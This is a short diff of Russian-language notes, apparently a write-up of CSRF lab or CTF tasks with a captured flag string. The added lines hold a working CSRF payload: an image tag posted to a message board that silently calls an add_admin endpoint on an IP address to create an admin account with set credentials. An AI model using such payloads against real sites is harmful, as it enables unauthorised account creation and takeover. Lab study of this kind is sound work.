@@ -4,3 +4,5 @@
 2. Post CSRF
   сделал тоже самое, хз наверное надо было по другому как то. "DID_YOU_LIKE_POST_CSRF"
 3. JSON based CSRF
+   зашел вошел в message board написал тайный запрос в картинку и стал админом
+   <img src=""http://92.63.179.34/add_admin?username=seregapirat&password=eshkeree33&isAdmin=yes&submit=Add+User">
